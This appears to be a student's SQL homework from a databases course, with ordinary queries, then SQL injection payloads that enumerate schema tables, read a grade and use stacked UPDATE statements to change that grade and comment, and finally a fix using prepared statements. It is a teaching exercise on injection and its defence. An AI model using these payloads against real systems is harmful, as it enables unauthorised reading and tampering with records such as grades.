-- P1
-- a) En uchile.transparencia obtener los datos de los académicos cuyo apellido paterno es 'Arenas' ordenados por sueldo descendente
SELECT *
FROM uchile.transparencia
WHERE apellido_p = 'Arenas'
ORDER BY total DESC;

-- b) En nota.cc3201 obtener mi nota final
SELECT nota, comentario
FROM nota.cc3201
WHERE nombre = 'Rojas Valenzuela, Adolfo Ignacio'; -- id = 76

-- c) Ver todos los esquemas y sus tablas, posteriormente ver las columnas y su data type de la tabla cc3201
SELECT table_schema, table_name
FROM information_schema.tables;

SELECT column_name, data_type 
FROM information_schema.columns
WHERE table_name = 'cc3201' 
AND table_schema = 'nota';

-- P2
/* a) Devolver todas las tablas en la base de datos
' UNION 
SELECT table_name, table_schema, 'x', 0, 0, 0 
FROM information_schema.tables
 -- '
*/

/* b) Devolver las columnas de la tabla nota.cc3201 y sus tipos
 ' UNION
 SELECT column_name, data_type, 'x', 0, 0, 0
 FROM information_schema.columns
 WHERE table_name = 'cc3201' 
 AND table_schema = 'nota'
 -- '
*/

/* c) Devolver su nota en la tabla nota.cc3201
 ' UNION
 SELECT comentario, 'Rojas', 'Valenzuela', 0, 0, nota
 FROM nota.cc3201
 WHERE nombre = 'Rojas Valenzuela, Adolfo Ignacio'
 -- '
*/

/* d) Cambiar su nota en la tabla nota.cc3201
 ';
 UPDATE nota.cc3201
 SET nota = 4.0
 WHERE nombre = 'Rojas Valenzuela, Adolfo Ignacio'
 -- '
*/

/* e) Cambiar su comentario en la tabla nota.cc3201
 ';
 UPDATE nota.cc3201
 SET comentario = 'Dou, DII supremacy ඞ'
 WHERE nombre = 'Rojas Valenzuela, Adolfo Ignacio'
 -- '
*/

/*
diff:
v1:
    $conn = pg_connect("host = localhost port = 5432 dbname = cc3201 user = cc3201 password = j'<3_cc3201");
    $result = pg_query($conn, "SELECT ... WHERE apellido_p='" . $name . "'");

v2: 
    $pdo = new PDO("pgsql:host=localhost;port=5432;dbname=cc3201;user=cc3201;password=j'<3_cc3201");
    $stmt = $pdo->prepare("SELECT ... WHERE apellido_p=?");
    $stmt->execute([$name]);

Los ataques no funcionan porque en lugar de concatenar directamente los valores en la consulta, se utilizan parámetros preparados, o sea los valores se envían por separado de la consulta
*/